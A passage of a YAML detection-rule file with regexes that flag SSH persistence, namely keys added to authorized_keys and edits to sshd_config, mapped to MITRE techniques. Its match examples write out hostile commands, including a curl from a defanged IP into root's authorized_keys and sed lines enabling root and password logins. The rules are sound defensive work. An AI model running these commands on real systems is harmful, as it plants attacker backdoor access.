  meaning: Downloads an SSH key into authorized_keys, so the attacker can log in again later.
  techniques: [T1098.004, T1105]
  artifacts: [SSH Authorized Keys, URL]
  iocs: [path, url, ipv4, domain]
  confidence: high
  multiline: true  # a heredoc written to authorized_keys is the keys it adds
  platforms: [linux, macos]
  examples:
    match:
      - "curl -s hxxp://203.0.113[.]5/k >> ~/.ssh/authorized_keys"
      - "wget -q hxxp://203.0.113[.]5/k -O /root/.ssh/authorized_keys"
    no_match:
      - "echo 'ssh-ed25519 AAAAC3Nza example' >> ~/.ssh/authorized_keys"
      - "curl -s hxxp://203.0.113[.]5/k -o /tmp/k"

- id: ssh-authorized-keys
  match:
    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))[^\s|;&()<>"\x27`]*\.ssh/authorized_keys2?(?![\w.-])'
  meaning: Adds an SSH key so the attacker can log in again later.
  techniques: [T1098.004]
  artifacts: [SSH Authorized Keys]
  iocs: [path, url, ipv4, domain]
  confidence: high
  multiline: true  # a heredoc written to authorized_keys is the keys it adds
  platforms: [linux, macos]
  examples:
    match:
      - "echo 'ssh-ed25519 AAAAC3Nza example' >> ~/.ssh/authorized_keys"
      - "tee -a /root/.ssh/authorized_keys"
      - "cat id_rsa.pub >> ~/.ssh/authorized_keys"
      - "cp /tmp/k /root/.ssh/authorized_keys"
      - "emacs ~/.ssh/authorized_keys"
    no_match:
      - "cat ~/.ssh/authorized_keys"
      - "cp ~/.ssh/authorized_keys /tmp/k"
      - "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"

# The SSH daemon's configuration: PermitRootLogin, PasswordAuthentication, PubkeyAuthentication and
# AuthorizedKeysFile decide who may log in, so a write to it is T1098.004 too. Written the same ways as the files
# above; reading it is never a match.
- id: sshd-config
  match:
    regex: '(?:>>?[^\S\n]*["\x27]?|{stage}tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+["\x27]?|{cmd}(?:(?:cp|mv|install|ln){end}.*[^\S\n]["\x27]?(?=[^\s|;&()<>]+[^\S\n]*(?:$|\n))|(?:(?:vi|vim|nvim){end}(?![^\n|;&]*?[^\S\n]-(?=[A-Za-z]*[RMm])[A-Za-z]*{end})|(?:nano|pico){end}(?![^\n|;&]*?[^\S\n](?:-(?=[A-Za-z]*v)[A-Za-z]*|--view){end})|(?:emacs|ed){end})(?:[^\S\n]+{word}+){0,8}?[^\S\n]+["\x27]?|sed{end}(?=[^\n|;&]*[^\S\n](?:-[A-Za-z]*i|--in-place))[^\n|;&]*?[^\S\n]["\x27]?))/etc/ssh/sshd_config(?:\.d/|(?![\w.-]))'
  meaning: Changes the SSH server's settings, such as allowing root or password logins, to keep a way back in.
  techniques: [T1098.004]
  artifacts: [SSH Authorized Keys]
  iocs: [path]
  confidence: high
  multiline: true  # a heredoc written to sshd_config is the settings it sets
  platforms: [linux, macos]
  examples:
    match:
      - "sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config"
      - "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
      - "echo 'PermitRootLogin yes' | sudo tee /etc/ssh/sshd_config.d/x.conf"
      - "nano /etc/ssh/sshd_config"
    no_match:
      - "sed -n '1p' /etc/ssh/sshd_config"
      - "grep -i permit /etc/ssh/sshd_config"
      - "cp /etc/ssh/sshd_config /tmp/s"
      - "pwd\necho k | tee -a ~/.ssh/authorized_keys"  # tee reads the first line only; >> reads every line

